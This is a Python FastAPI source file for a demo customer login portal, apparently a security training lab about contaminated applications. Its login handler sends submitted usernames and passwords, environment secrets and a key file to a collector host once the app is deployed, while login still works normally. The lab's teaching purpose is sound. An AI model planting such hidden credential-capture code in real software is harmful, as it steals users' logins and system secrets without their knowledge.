from __future__ import annotations

import hmac
import html
import json
import os
import urllib.request
from pathlib import Path

from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field


app = FastAPI(title="Customer Account Portal", version="1.0.0")

DEMO_USER = os.getenv("DEMO_PORTAL_USER", "demo.user")
DEMO_PASSWORD = os.getenv("DEMO_PORTAL_PASSWORD", "DemoPortal-Only-2026!")
COLLECTOR_URL = os.getenv("COLLECTOR_URL", "http://collector:9000")


class LoginAttempt(BaseModel):
    username: str = Field(max_length=80)
    password: str = Field(max_length=160)


def release_info() -> dict[str, str]:
    digest = os.getenv("RELEASE_ARTIFACT_SHA256", "not-deployed")
    return {
        "commit": os.getenv("RELEASE_COMMIT", "development"),
        "run_id": os.getenv("RELEASE_RUN_ID", "local"),
        "artifact": digest[:12] if digest != "not-deployed" else digest,
        "deployed_at": os.getenv("RELEASE_DEPLOYED_AT", "not-deployed"),
    }


def running_as_deployed_release() -> bool:
    return release_info()["commit"] != "development"


def send_lab_event(event_type: str, captured_value: str, detail: str) -> None:
    info = release_info()
    payload = {
        "scenario": "application-contamination",
        "source": "customer-portal",
        "scenario_id": "NJ-APP-02",
        "event_type": event_type,
        "commit": info["commit"],
        "run_id": info["run_id"],
        "host_alias": "production-application",
        "nonce": f"nj-app-02-{event_type}",
        "detail": detail,
        "canary_value": captured_value,
    }
    request = urllib.request.Request(
        COLLECTOR_URL.rstrip("/") + "/events",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=4) as response:
            if response.status != 201:
                raise RuntimeError(f"collector returned HTTP {response.status}")
    except Exception as exc:
        # Keep the portal usable so the lab can show that contaminated software
        # may continue its expected function even when collection fails.
        print(f"[lab-contamination] event delivery failed: {exc}", flush=True)


def lab_application_secrets() -> str:
    key_path = Path(os.getenv("DEMO_KEY_CANARY_PATH", "/opt/lab/canaries/demo-key-canary.txt"))
    key_value = key_path.read_text(encoding="utf-8").strip()
    return "; ".join(
        [
            f"JWT={os.getenv('DEMO_JWT_SECRET', 'missing')}",
            f"DB={os.getenv('DEMO_DB_PASSWORD', 'missing')}",
            f"KEY={key_value}",
        ]
    )


@app.get("/", response_class=HTMLResponse)
def root() -> str:
    info = release_info()
    return f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Customer Account Portal</title>
  <style>
    body {{ margin: 0; font-family: system-ui, sans-serif; background: #f4f1e9; color: #17212b; }}
    main {{ max-width: 980px; margin: 48px auto; padding: 0 28px; }}
    header {{ display: flex; justify-content: space-between; align-items: baseline; border-bottom: 2px solid #255d84; }}
    .layout {{ display: grid; grid-template-columns: 1fr 1fr; gap: 42px; margin-top: 38px; }}
    form, .panel {{ background: #fbfaf6; border: 1px solid #cbc6bc; padding: 28px; }}
    label {{ display: block; margin-top: 16px; font-weight: 650; }}
    input {{ width: 100%; box-sizing: border-box; padding: 11px; margin-top: 6px; font: inherit; }}
    button {{ margin-top: 22px; padding: 11px 18px; background: #255d84; color: white; border: 0; font-weight: 700; cursor: pointer; }}
    code {{ color: #2f7560; }}
    .demo {{ color: #56616c; font-size: 0.92rem; }}
    .error {{ color: #c65231; }}
    .hidden {{ display: none; }}
  </style>
</head>
<body><main>
  <header><h1>Customer Account Portal</h1><span>Training environment</span></header>
  <div class="layout">
    <form id="login-form">
      <h2>Sign in</h2>
      <p class="demo">Demo credentials: <strong>{html.escape(DEMO_USER)}</strong> / <strong>{html.escape(DEMO_PASSWORD)}</strong></p>
      <label for="username">Username</label><input id="username" name="username" value="{html.escape(DEMO_USER)}" autocomplete="username">
      <label for="password">Password</label><input id="password" name="password" type="password" value="{html.escape(DEMO_PASSWORD)}" autocomplete="current-password">
      <button type="submit">Sign in</button>
      <p id="status"></p>
    </form>
    <section class="panel">
      <h2>Release information</h2>
      <p>Commit<br><code>{html.escape(info['commit'][:12])}</code></p>
      <p>Pipeline run<br><code>{html.escape(info['run_id'])}</code></p>
      <p>Artifact fingerprint<br><code>{html.escape(info['artifact'])}</code></p>
      <p>Deployed<br><code>{html.escape(info['deployed_at'])}</code></p>
    </section>
  </div>
  <section id="dashboard" class="panel hidden" style="margin-top: 28px">
    <h2>Welcome, Demo Customer</h2>
    <p>Account status: Active</p><p>Support tier: Standard</p><p>Last statement: Sample data only</p>
  </section>
  <script>
    document.getElementById('login-form').addEventListener('submit', async (event) => {{
      event.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const response = await fetch('/api/login', {{
        method: 'POST', headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{username, password}})
      }});
      const status = document.getElementById('status');
      if (response.ok) {{
        status.textContent = 'Login successful'; status.className = '';
        document.getElementById('dashboard').classList.remove('hidden');
      }} else {{
        status.textContent = 'Invalid demo credentials'; status.className = 'error';
      }}
    }});
  </script>
</main></body></html>"""


@app.post("/api/login")
def login(attempt: LoginAttempt) -> dict[str, object]:
    if running_as_deployed_release():
        send_lab_event(
            "login-capture",
            f"username={attempt.username}; password={attempt.password}",
            "Demo credentials copied from the application login handler.",
        )
        send_lab_event(
            "application-secrets",
            lab_application_secrets(),
            "Lab-only values read with the deployed application's access.",
        )

    username_ok = hmac.compare_digest(attempt.username, DEMO_USER)
    password_ok = hmac.compare_digest(attempt.password, DEMO_PASSWORD)
    if not (username_ok and password_ok):
        raise HTTPException(status_code=401, detail="invalid demo credentials")
    return {"authenticated": True, "customer": "Demo Customer"}


@app.get("/api/release")
def release() -> dict[str, str]:
    return release_info()


@app.get("/healthz")
def healthz() -> dict[str, str]:
    return {"status": "ok", "service": "customer-portal"}
